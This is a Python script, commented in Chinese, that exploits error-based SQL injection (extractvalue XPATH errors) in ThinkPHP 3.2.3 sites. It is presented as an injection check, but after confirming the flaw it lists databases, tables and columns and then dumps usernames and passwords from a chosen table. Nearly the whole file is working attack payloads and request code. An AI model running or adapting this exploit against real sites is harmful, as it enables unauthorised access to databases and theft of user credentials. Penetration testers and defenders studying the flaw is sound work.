'''
用于检测thinkphp3.2.3是否存在注入
该脚本在是根据在实战中遇到的问题而编写
不是很全面，仅供参考
'''
import requests
import re
import sys
version=['']
database_name=['']
table_name=['']
column_name=['']
user_value=['']
pass_value=['']
#检测是否存在漏洞
def check(url):
    urls=") and extractvalue(0x0a,concat(0x0a,(select version())))--+"
    url_all=url+urls
    resp = requests.get(url_all).content.decode('utf-8')
    if '1105:XPATH syntax error:' in resp:
        return 1
    else:
        return 0

#查询数据库名
def database(url):
    urls=") and extractvalue(0x0a,concat(0x0a,(select database())))--+"
    url=url+urls
    resp=requests.get(url).content.decode('utf-8')
    #print(resp)
    obj=re.compile(r"<h1>1105:XPATH.*?error: '(?P<table>.*?)'",re.S)
    result_database=obj.finditer(resp)
    for it in result_database:
        database_name.append(it.group("table").strip('\n'))
    print('输出数据库名:')
    for i in range(len(database_name)):
        print(database_name[i])
#查询表名
def table(url,database_value):
    for i in range(0,27):
        urls=f") and extractvalue(0x0a,concat(0x0a,(select (concat_ws(0x0a,table_name)) from information_schema.tables where table_schema='{database_value}' limit {i},1)))--+"
        url_all=url+urls
        resp=requests.get(url_all).content.decode('utf-8')
        #print(resp)
        obj=re.compile(r"<h1>1105:XPATH.*?error: '(?P<table>.*?)'",re.S)
        result_table=obj.finditer(resp)
        for it in result_table:
           table_name.append(it.group("table").strip('\n'))
    print('输出表名:')
    for i in range(len(table_name)):
        print(table_name[i])

#查询列名
def column(url,table_value):
    for i in range(0,3):
        urls=f") and extractvalue(0x0a,concat(0x0a,(select (concat_ws(0x0a,column_name)) from information_schema.columns where table_name='{table_value}' limit {i},1)))--+"
        url_all=url+urls
        resp=requests.get(url_all).content.decode('utf-8')
        obj=re.compile(r"<h1>1105:XPATH.*?error: '(?P<table>.*?)'",re.S)
        result_column=obj.finditer(resp)
        for it in result_column:
            column_name.append(it.group("table").strip('\n'))
    print('输出列名')
    for i in range(len(column_name)):
        print(column_name[i])
#列出用户名
def value_user(url,user_name,table_value):
    for i in range(0,3):
        urls=f") and extractvalue(0x0a,concat(0x0a,(select (concat_ws(0x7e,{user_name})) from {table_value} limit {i},1)))--+"
        url_all=url+urls
        resp=requests.get(url_all).content.decode('utf-8')
        obj = re.compile(r"<h1>1105:XPATH.*?error: '(?P<table>.*?)'", re.S)
        user = obj.finditer(resp)
        for it in user:
            user_value.append(it.group("table").strip('\n'))
    print('请输出用户名: ')
    for i in range(len(user_value)):
        print(user_value[i])
#列出密码
def value_pass(url,user_pass,table_value):
    for i in range(0,3):
        urls=f") and extractvalue(0x0a,concat(0x0a,(select (concat_ws(0x7e,{user_pass})) from {table_value} limit {i},1)))--+"
        url_all=url+urls
        resp=requests.get(url_all).content.decode('utf-8')
        obj = re.compile(r"<h1>1105:XPATH.*?error: '(?P<table>.*?)'", re.S)
        user = obj.finditer(resp)
        for it in user:
            pass_value.append(it.group("table").strip('\n'))
    print('请输出密码: ')
    for i in range(len(user_value)):
        print(pass_value[i])

if __name__=='__main__':

    url=input('输入url: ')
    check1=check(url)
    print(check1)
    if check1==0:
        print('不存在漏洞')
    else:
        print('存在漏洞')
        database(url)
        database_value = input('请输入数据库名: ')
        table(url,database_value)
        table_value=input('请输入要查询的表名: ')
        column(url,table_value)
        user_name=input('请输入用户名: ')
        user_pass=input('请输入密码: ')
        value_user(url,user_name,table_value)
        value_pass(url,user_pass,table_value)

